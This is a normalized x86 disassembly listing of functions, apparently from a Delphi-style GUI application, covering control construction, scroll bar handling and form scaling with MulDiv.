mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_4657cc
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_453e1c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_465650
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_4651e8
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_4659ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44fb48
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_464e68
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_464e68
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_465a64
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403174
mov eax [ esi + 0x20c ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44fc6c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_465ab0
push ebx
mov ebx eax
mov eax ebx
call sub_450dd4
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_465cc8
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bf3c
test al al
jne r-xdata
mov eax ebx
call sub_453e1c
push eax
call sub_42c1dc
sub_465af0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_465c48
mov ecx edi
mov edx esi
mov eax ebx
call sub_45051c
pop edi
pop esi
pop ebx
retn
sub_465b30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_465c38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44d038
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_465100
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_450b4c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_465650
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_450b10
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_450b10
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_41814c
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_44cda4
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465c3f
mov eax [ ebp - 0x10 ]
call sub_403174
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_464f48
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4182a8
xor ecx ecx
mov edx 0xb03e
call sub_44e7e8
inc ebx
dec esi
jne r-xdata
sub_465c6c
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_4657a0
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_4657a0
mov eax ebx
call sub_465c48
jmp r-xdata
sub_465cc8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_454120
test al al
je r-xdata
xor eax eax
push ebp
push sub_465db3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_465268
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_465268
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_4658d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_4658d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_4658d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4658d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_4658d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4658d4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_465dd8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_44d14c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_44d178
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_44d14c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_44d178
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_44d038
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_465650
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_44d038
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_44d07c
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_465650
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_44d038
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_465650
mov eax ebx
call sub_44d038
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_44d07c
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_44d07c
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_465650
mov eax ebx
call sub_44d07c
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_465f2c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_465650
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_465650
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4657a0
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4657a0
sub_465fd0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_465f2c
mov ecx edi
mov edx esi
mov eax ebx
call sub_453928
pop edi
pop esi
pop ebx
retn
sub_465ff8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_466062
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452408
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466069
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_466069
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_4660a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465c48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4660a8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_4660a8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_465cc8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_46611c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d07c
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_429464
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_44d038
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_429464
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_416c78
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_44fe88
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_46618c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4661ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_403300
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_453198
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4661f4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_46621c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4659ec
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_44cdf0
mov edx 0x29
mov eax esi
call sub_44ce14
mov [ esi + 0x220 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_46627c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_465aa0
xor eax eax
mov al [ ebx + 0x220 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_4662e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_453434
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
mov eax ebx
call sub_4513bc
sub_466314
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466478
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_466458
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4030bc
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_4034c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46645f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_466420
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_417edc
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4030c4
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
call sub_403928
sub_4664a0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403370
and [ ebx + 0x2f4 ] 0xdf
sub_4664d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4659ec
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_44cda4
xor edx edx
mov eax ebx
call sub_44cdc8
mov edx 0x140
mov eax ebx
call sub_44cdf0
mov edx 0xf0
mov eax ebx
call sub_44ce14
mov dl 0x1
mov eax [ r-xdata ]
call sub_4289f8
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_466df4
mov dl 0x1
mov eax [ r-xdata ]
call sub_424360
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_44c210
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4030bc
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_467158
xor edx edx
mov eax ebx
call sub_44d7f8
xor edx edx
mov eax ebx
call sub_44d760
mov dl 0x1
mov eax ebx
call sub_453f5c
mov edx ebx
mov eax [ rw-data ]
call sub_46b7bc
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_466651
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_420c68
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_418444
xor edx edx
mov eax ebx
call sub_41ba98
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_46a664
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_4666bc
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403528
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_466786
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_468fe0
mov eax [ ebp - 0x4 ]
call sub_454120
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46b7f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403174
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403174
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40cfec
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_465a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46678d
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_4667a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_4667e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_467158
sub_4667e6
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403370
test al al
jne r-xdata
call sub_4039a4
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403950
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_467158
sub_46681c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push j_sub_40363c#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_46687c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44f6f0
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403370
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_468b24
sub_4668b8
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44cb04
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_41814c
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_467f1c
mov edx esi
mov eax ebp
call sub_418444
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_467ef4
mov edx esi
mov eax edi
call sub_467f1c
jmp r-xdata
xor edx edx
mov eax edi
call sub_467ed0
sub_4669c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4506b4
xor edx edx
push ebp
push sub_466c1a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44fe10
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44d050
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44d094
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_466d4c
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44e7e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466c21
mov eax [ ebp - 0x4 ]
call sub_4506bc
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_465f2c
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4538e0
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_465f2c
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4538e0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_423c24
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_423c2c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_466c29
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45115c
push 0x0
push 0x0
push ebx
push sub_466d30
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_466cfc
push ebx
push sub_466d14
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
